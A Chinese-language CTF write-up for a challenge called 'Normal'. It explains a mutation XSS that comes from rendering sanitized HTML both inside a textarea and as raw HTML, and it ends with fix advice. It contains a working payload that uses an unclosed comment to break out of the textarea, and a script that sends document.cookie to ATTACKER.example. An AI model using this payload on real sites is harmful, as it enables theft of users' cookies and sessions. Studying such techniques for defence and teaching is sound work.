# Normal

## 题目简述

应用把用户提交的 HTML 交给 `pybluemonday` 清洗，然后在同一模板中使用两次：一次放进 `<textarea>`，一次作为 `safe` HTML 渲染。清洗策略显式允许注释，而浏览器在 `textarea` 的 RCDATA 上下文中会重新解释 `</textarea>`。利用清洗器与浏览器解析上下文的差异，可以用未闭合注释携带结束标签，逃出文本框并形成 Mutation XSS，读取管理员机器人设置的非 HttpOnly flag Cookie。

## 解题过程

### 找到危险的双重插入上下文

后端只清洗一次：

```python
@app.route("/")
def index():
    html = request.args.get("html") or ""
    return render_template("index.html", html=sanitize_html(html))
```

模板却把结果同时放进 RCDATA 和普通 HTML 上下文：

```html
<textarea name="html" autofocus>{{ html | safe }}</textarea>

{{ html | safe }}
```

清洗策略包含 `SANITIZER.AllowComments()`。因此以 `<!--` 开头、但不闭合注释的片段可以穿过清洗器。若只从清洗后的独立 HTML 片段判断，它后面的标签仍位于注释中；但第一次插入发生在 `<textarea>` 内，浏览器会把匹配的 `</textarea>` 当作 RCDATA 结束标签，随后把 `<script>` 当成真正标签解析。这就是解析结果发生变化的关键。

### 构造 mXSS 与回传

最小验证 payload 为：

```html
<!-- </textarea><script>alert(document.domain)</script>
```

实际取 flag 时，将脚本改成把 Cookie 编码后发送到自己控制的接收端：

```html
<!-- </textarea><script>
location.href = "https://ATTACKER.example/collect?c=" +
                encodeURIComponent(document.cookie);
</script>
```

把整段 URL 编码到 `html` 查询参数中，形成机器人能够访问的同源地址。例如在题目容器的内部地址为 `http://localhost:5000` 时，提交目标形如：

```text
http://localhost:5000/?html=%3C%21--%20%3C%2Ftextarea%3E%3Cscript%3E...
```

`/report` 只要求 URL 匹配 `^http(s)?://.*`，随后直接让 Puppeteer 访问。机器人访问基地址后设置：

```javascript
await page.setCookie({
    name: "flag",
    value: "shellmates{$Om3BODy_hA$_t0_ruIN_3VERYTHIng_A$_ALW4Y$}",
    url: "http://localhost:5000",
    httpOnly: false
});
```

由于 Cookie 不是 HttpOnly，同源 XSS 可从 `document.cookie` 读取它。接收端拿到 `flag=...` 后，最终 flag 为：

```text
shellmates{$Om3BODy_hA$_t0_ruIN_3VERYTHIng_A$_ALW4Y$}
```

## 方法总结

HTML 清洗是否安全取决于清洗结果最终进入的上下文。允许注释的片段放入 `textarea` 后，浏览器对 RCDATA 结束标签的处理会改变原先的节点结构，使独立片段检查失效。修复时不能把同一份 `safe` HTML塞入属性、RCDATA 和普通 DOM 等不同上下文；文本框应使用默认转义，展示区也应使用经过目标上下文验证的 DOM 清洗结果。同时，敏感 Cookie 至少应设置 `HttpOnly`，报告机器人还应限制可访问的源。
